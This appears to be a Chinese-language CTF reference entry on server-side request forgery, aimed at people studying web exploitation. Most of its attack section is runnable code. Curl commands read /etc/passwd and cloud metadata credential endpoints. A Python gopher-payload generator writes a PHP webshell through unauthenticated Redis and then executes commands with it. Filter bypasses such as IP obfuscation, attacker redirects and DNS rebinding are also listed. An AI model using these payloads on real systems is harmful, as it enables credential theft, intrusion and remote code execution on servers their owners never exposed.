---
title: SSRF 服务端请求伪造（内网穿透 / gopher 打 Redis / 云元数据）
category: web
tags: [ssrf, gopher, redis 未授权, 云元数据, 内网探测]
signals: [url 参数, 远程图片加载, webhook 回调, 可以请求任意地址, gopher 协议, 云服务器元数据, 169.254.169.254, 内网 127.0.0.1 有 redis, 提供了 url 抓取功能]
difficulty: medium
source: "PortSwigger / PayloadsAllTheThings / HackTricks"
tools: [curl, burpsuite, gopherus, python]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 有 `?url=`、`?image=`、`?avatar=`、`?link=` 之类的参数，服务端会去"抓取"这个地址。
- webhook / 回调 / 导入 URL / 在线预览 功能。
- 题面提示"服务器可以访问内网"、"有 Redis"、"只允许 http 协议"。
- 返回里能看到对目标 URL 的响应内容（回显 SSRF）。
- 只允许 `http://` 但 `file://` 被拦 → 需要协议绕过。
- 关键词：SSRF、内网、元数据、curl、redis、gopher。

## 二、原理

应用用 `curl`/`requests`/`file_get_contents` 访问用户给的 URL，攻击者借此让**服务器**发起请求：

- **内网探测**：访问 `127.0.0.1:6379`、`172.17.0.1`、`10.x` 探测开放端口和服务；
- **云元数据**：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`（AWS）、GCP/Azure 的同类端点，能拿临时凭据；
- **协议利用**：`gopher://` 可构造任意 TCP 字节流 → 打 Redis（写 crontab/写 ssh key/主从复制 RCE）、打 MySQL、打 FastCGI；
- **file 读取**：`file:///etc/passwd`；
- **dict**：`dict://127.0.0.1:6379/info` 打 Redis 命令。

## 三、解题步骤

1. 确认回显型还是盲 SSRF（回显可直接读内容，盲的用延时/DNS 外带）。
2. 用 `http://127.0.0.1:PORT` 扫常见端口（6379 Redis、3306 MySQL、9000 PHP-FPM、8080 内网服务）。
3. 探测云元数据：`169.254.169.254`。
4. 打 Redis：`gopher://127.0.0.1:6379/_<URL 编码的 RESP 命令>`。
5. 用 Gopherus 自动生成 gopher payload。
6. 若有过滤，做 IP 变形 / 重定向 / DNS rebinding 绕过。

## 四、可直接运行的脚本

基础探测：

```bash
# 内网回显
curl "http://TARGET/fetch?url=http://127.0.0.1:80/"
curl "http://TARGET/fetch?url=http://127.0.0.1:6379/"       # Redis 报 -ERR unknown command
curl "http://TARGET/fetch?url=file:///etc/passwd"
curl "http://TARGET/fetch?url=dict://127.0.0.1:6379/info"

# 云元数据（AWS）
curl "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 阿里云元数据
curl "http://TARGET/fetch?url=http://100.100.100.200/latest/meta-data/"

# GCP（需要 header，用 gopher/bin 不便，通常靠重定向）
curl "http://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
```

用 gopher 打 Redis（写 webshell / 反弹）：

```bash
# 1. 安装 gopherus
git clone https://github.com/tarunkant/Gopherus && cd Gopherus
python2 gopherus.py --exploit redis

# 2. 手工构造：目标命令
#    CONFIG SET dir /var/www/html
#    CONFIG SET dbfilename shell.php
#    SET x "<?php system($_GET['c']); ?>"
#    SAVE
# 3. 把 RESP 协议字符串做 URL 编码后放进 gopher://
#    （下面的 python 生成器更方便）
```

Python 生成 gopher payload：

```python
import urllib.parse

def resp_cmd(*cmds):
    """把若干 Redis 命令编码成 RESP，返回 gopher URL 用的 payload 部分"""
    out = b""
    for c in cmds:
        parts = c if isinstance(c, (list, tuple)) else c.split()
        out += ("*%d\r\n" % len(parts)).encode()
        for p in parts:
            pb = p.encode() if isinstance(p, str) else p
            out += ("$%d\r\n" % len(pb)).encode() + pb + b"\r\n"
    return out

def gopher_url(host, port, cmds):
    payload = resp_cmd(*cmds)
    return "gopher://%s:%d/_%s" % (host, port, urllib.parse.quote(payload, safe=""))

# 写 webshell 到 web 目录
cmds = [
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    "SET x \"<?php system($_GET['c']); ?>\"",
    "SAVE",
]
print(gopher_url("127.0.0.1", 6379, cmds))
```

配合 SSRF 提交：

```python
import requests
u = gopher_url("127.0.0.1", 6379, cmds)
r = requests.get("http://TARGET/fetch", params={"url": u})
print(r.status_code, r.text[:200])
# 之后访问 http://TARGET/shell.php?c=id
```

盲 SSRF 的外带检测（DNS / HTTP）：

```python
# 用 webhook.site 或自建服务：http://HOST:8000 接收 127.0.0.1 的请求无意义，
# 正确做法是让目标访问一个能观测的地址：
# 1) 用自己的公网 vps: http://VPS:8000/probe?id=ssrf
# 2) 监听：
python -m http.server 8000
```

## 五、常见坑 / 变体

- **Redis 未授权**：直接 `dict://127.0.0.1:6379/info` 就能验；再用 `CONFIG SET` 写文件。
- **Redis 保护模式**：`CONFIG` 被改名/禁用（`rename-command`），改试 `SLAVEOF` 主从复制 RCE、`MODULE LOAD`。
- **`gopher` 需要 `_` 前缀**：`gopher://host:port/_<payload>`，payload 里的 `%0d%0a` 必须是编码后的。
- **FTP 打 Redis 的替代**：`ftp://` 配合 `RETR` 也能发字节，但 Redis 主从复制用 gopher 更通用。
- **`file://` 被拦**：用 `file://localhost/etc/passwd`、`http://127.0.0.1/file:///...`、`php://filter`。
- **IP 变形绕过黑名单**：`2130706433`（十进制）、`0x7f000001`、`127.1`、`127.0.0.1.nip.io`、`[::1]`、`0`、`localhost`。
- **302 重定向绕过**：`http://attacker/redirect?to=http://169.254.169.254/...`。
- 变体：**DNS rebinding**（同一域名先解析到公网再解析到内网）、**URL 解析差异**（`http://127.0.0.1@evil.com`）。
- 变体：**PHP-FPM (9000)** 用 gopher 构造 `FastCGI` 包执行代码，见 Gopherus `--exploit fastcgi`。

## 六、参考来源

- [PortSwigger Web Security Academy - SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [HackTricks - SSRF](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)
- [Gopherus（gopher payload 生成器）](https://github.com/tarunkant/Gopherus)
- [CTF-Wiki SSRF](https://ctf-wiki.org/web/ssrf/)
- [OWASP Top 10 2021 - A10:2021 SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
